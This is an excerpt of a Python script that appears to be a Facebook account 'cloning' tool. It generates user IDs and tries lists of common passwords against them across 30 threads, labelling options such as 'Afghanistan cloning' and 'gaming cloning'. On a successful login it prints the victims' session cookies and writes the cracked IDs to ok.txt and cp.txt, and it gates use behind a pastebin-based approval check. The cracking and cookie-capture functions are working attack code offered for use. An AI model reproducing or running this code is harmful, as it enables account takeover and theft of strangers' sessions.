...
logo = """
--------------------------------------------------
[+] AUTHOR     : \033[1;32mBALOCH\033[1;37m
[+] GITHUB     : \033[1;32m BALOCH356\033[1;37m
[+] TOOL NAME  : \033[1;32mRANDOM\033[1;37m
--------------------------------------------------
[+] \033[1;37mVERSION    :\033[1;32m 1.0.0 \033[1;37m
--------------------------------------------------"""
...
def dynamic(text):
    ...
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(0)
def get_ascii_art(name):
    ascii_art = pyfiglet.figlet_format(name, font= "banner3")
    return ascii_art

user_input = input("Enter your name (press Enter for default name): ")
...
def Baloch ():
	...
	if gh =='1':
		...
		os.system('xdg-open https://chat.whatsapp.com/CgOd10XF9yKIdwiQd1BenO')
	elif gh =='0':
		...
		time.sleep(2)
		Baloch ()
#os.system("xdg-open https://www.facebook.com/profile.php?id=100072602405512")
def menu():
	os.system('clear')
	print('\033[1;32m',ascii_art)
	print(logo)
	...
	print('[4] Afghanistan cloning ')
	print('[5] gaming cloning')
...
def pubg():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'600700','500500','afghan','20003000']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'freefire','fflover','pubgking','ffqueen']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FAHAD-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[FAHAD-CP] '+uid+' | '+ps+'\x1b[1;97m')
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://pastebin.com/raw/HAVK57yf').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923143572356?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
